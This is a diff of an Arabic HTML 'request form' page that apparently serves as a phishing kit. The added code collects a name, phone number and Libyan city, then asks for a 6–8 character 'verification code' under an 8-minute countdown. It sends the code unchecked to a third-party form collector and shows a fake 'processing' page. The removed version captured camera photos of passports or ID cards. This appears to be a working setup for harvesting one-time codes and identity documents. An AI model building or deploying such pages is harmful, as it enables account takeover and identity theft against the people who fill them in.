@@ -1,170 +1,196 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>نموذج البيانات</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>نموذج الطلب</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      padding: 30px;
-      direction: rtl;
-    }
-    form {
-      background: white;
+      background: #f1f1f1;
       padding: 20px;
-      border-radius: 10px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      direction: rtl;
+      text-align: right;
+    }
+    form, .code-box, #waitingPage {
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #ccc;
+      max-width: 400px;
+      margin: 20px auto;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
     }
     input, select {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-top: 5px;
+      border-radius: 8px;
       border: 1px solid #ccc;
-      border-radius: 6px;
     }
     button {
-      background: #4CAF50;
-      color: white;
-      padding: 10px;
+      margin-top: 15px;
       width: 100%;
+      padding: 12px;
+      background-color: #4CAF50;
+      color: white;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
+      font-size: 16px;
       cursor: pointer;
     }
-    button:hover {
-      background: #45a049;
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
-    #videoContainer, #canvasContainer {
+    .code-box, #waitingPage {
       display: none;
-      text-align: center;
-      margin-top: 10px;
     }
-    video, canvas {
-      width: 100%;
-      border-radius: 10px;
-      max-height: 300px;
-    }
-    .camera-btn {
-      background: #444;
+    .timer {
       margin-top: 10px;
+      color: #d32f2f;
+      font-weight: bold;
+    }
+    .error {
+      color: red;
+      font-size: 13px;
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<form id="mainForm" action="https://formcarry.com/s/YOUR_FORM_ID" method="POST" enctype="multipart/form-data">
-  <h2>نموذج البيانات</h2>
-  <label>الاسم الثلاثي:</label>
-  <input type="text" name="full_name" required>
+<form id="mainForm" onsubmit="submitForm(event)">
+  <h2>نموذج الطلب</h2>
 
-  <label>اللقب:</label>
-  <input type="text" name="last_name" required>
+  <label for="fullName">الاسم الثلاثي</label>
+  <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
+  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية.</div>
 
-  <label>تاريخ الميلاد:</label>
-  <input type="date" name="birth_date" required>
+  <label for="phone">رقم الهاتف</label>
+  <input type="tel" id="phone" name="phone" required oninput="validateForm()">
 
-  <label>الجنس:</label>
-  <select name="gender" required>
-    <option value="">-- اختر --</option>
-    <option value="ذكر">ذكر</option>
-    <option value="أنثى">أنثى</option>
+  <label for="address">المدينة</label>
+  <select id="address" name="address" required onchange="validateForm()">
+    <option value="">اختر المدينة</option>
+    <option value="طرابلس">طرابلس</option>
+    <option value="بنغازي">بنغازي</option>
+    <option value="مصراتة">مصراتة</option>
+    <option value="البيضاء">البيضاء</option>
+    <option value="زليتن">زليتن</option>
+    <option value="سبها">سبها</option>
+    <option value="الخمس">الخمس</option>
+    <option value="درنة">درنة</option>
+    <option value="سرت">سرت</option>
+    <option value="طبرق">طبرق</option>
   </select>
 
-  <label>المستوى الدراسي:</label>
-  <select name="education_level" required>
-    <option value="">-- اختر --</option>
-    <option value="إعدادي">إعدادي</option>
-    <option value="ثانوي">ثانوي</option>
-    <option value="جامعي">جامعي</option>
-  </select>
-
-  <label>نوع المستند:</label>
-  <select name="document_type" id="documentType" required>
-    <option value="">-- اختر --</option>
-    <option value="جواز سفر">جواز سفر</option>
-    <option value="بطاقة شخصية">بطاقة شخصية</option>
-  </select>
-
-  <button type="button" class="camera-btn" onclick="startCamera()">📷 فتح الكاميرا</button>
-
-  <div id="videoContainer">
-    <video id="video" autoplay></video>
-    <button type="button" class="camera-btn" onclick="capturePhoto()">📸 التقط الصورة</button>
-  </div>
-
-  <div id="canvasContainer">
-    <canvas id="canvas"></canvas>
-  </div>
-
-  <input type="hidden" name="document_image" id="documentImageInput">
-
-  <label>رقم الهاتف:</label>
-  <input type="tel" name="phone" required>
-
-  <label>رقم هاتف احتياطي:</label>
-  <input type="tel" name="backup_phone" required>
-
-  <button type="submit" onclick="goToCodePage(event)">التالي</button>
+  <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
 </form>
 
+<div class="code-box" id="codeBox">
+  <h3>يرجى إدخال كود التوثيق</h3>
+  <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
+  <button onclick="submitCode()">إرسال</button>
+  <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
+</div>
+
+<div id="waitingPage">
+  <h2>تم استلام الكود</h2>
+  <p>طلبك قيد المعالجة وسيتم الرد خلال ساعة.</p>
+</div>
+
 <script>
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const videoContainer = document.getElementById('videoContainer');
-  const canvasContainer = document.getElementById('canvasContainer');
-  const documentImageInput = document.getElementById('documentImageInput');
+  const formcarryURL = "https://formcarry.com/s/12UxdOsTbaW";
 
-  let stream;
+  function validateForm() {
+    const name = document.getElementById("fullName").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const address = document.getElementById("address").value;
+    const nameError = document.getElementById("nameError");
 
-  function startCamera() {
-    videoContainer.style.display = "block";
-    canvasContainer.style.display = "none";
+    const nameIsValid = /^[\u0600-\u06FF\s]{8,}$/.test(name);
+    const phoneIsValid = /^\d{10,15}$/.test(phone);
+    const addressIsValid = address !== "";
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(s => {
-        stream = s;
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("حدث خطأ أثناء الوصول إلى الكاميرا: " + err.message);
-      });
-  }
-
-  function capturePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    canvasContainer.style.display = "block";
-
-    // تحويل الصورة إلى base64 وتخزينها
-    const imageData = canvas.toDataURL("image/png");
-    documentImageInput.value = imageData;
-
-    // إيقاف الكاميرا بعد الالتقاط
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
+    if (!nameIsValid && name.length > 0) {
+      nameError.style.display = "block";
+    } else {
+      nameError.style.display = "none";
     }
-    videoContainer.style.display = "none";
+
+    document.getElementById("submitBtn").disabled = !(nameIsValid && phoneIsValid && addressIsValid);
   }
 
-  function goToCodePage(event) {
+  function submitForm(event) {
     event.preventDefault();
-    const form = document.getElementById('mainForm');
 
-    fetch(form.action, {
-      method: 'POST',
-      body: new FormData(form),
-      headers: { 'Accept': 'application/json' }
-    }).then(response => {
+    const formData = {
+      fullName: document.getElementById('fullName').value.trim(),
+      phone: document.getElementById('phone').value.trim(),
+      address: document.getElementById('address').value,
+    };
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(formData)
+    })
+    .then(response => {
       if (response.ok) {
-        window.location.href = "code.html";
+        document.getElementById("mainForm").style.display = "none";
+        document.getElementById("codeBox").style.display = "block";
+        startTimer(8 * 60); // 8 دقائق
       } else {
-        alert("فشل في الإرسال. حاول مرة أخرى.");
+        alert("حدث خطأ أثناء إرسال البيانات.");
       }
+    })
+    .catch(error => {
+      alert("فشل الاتصال بـ Formcarry.");
+      console.error(error);
     });
+  }
+
+  function submitCode() {
+    const code = document.getElementById('verificationCode').value.trim();
+    const codeIsValid = /^[A-Za-z0-9]{6,8}$/.test(code);
+
+    if (!codeIsValid) {
+      alert("يرجى إدخال كود مكوّن من 6 إلى 8 أحرف أو أرقام فقط.");
+      return;
+    }
+
+    document.getElementById('codeBox').style.display = "none";
+    document.getElementById('waitingPage').style.display = "block";
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code: code })
+    }).catch(error => {
+      console.error("فشل الإرسال إلى Formcarry:", error);
+    });
+  }
+
+  function startTimer(duration) {
+    let timer = duration;
+    const timerDisplay = document.getElementById("timer");
+
+    const countdown = setInterval(() => {
+      const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
+      const seconds = String(timer % 60).padStart(2, '0');
+      timerDisplay.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
+      timer--;
+
+      if (timer < 0) {
+        clearInterval(countdown);
+        timerDisplay.textContent = "انتهى الوقت!";
+      }
+    }, 1000);
   }
 </script>
 
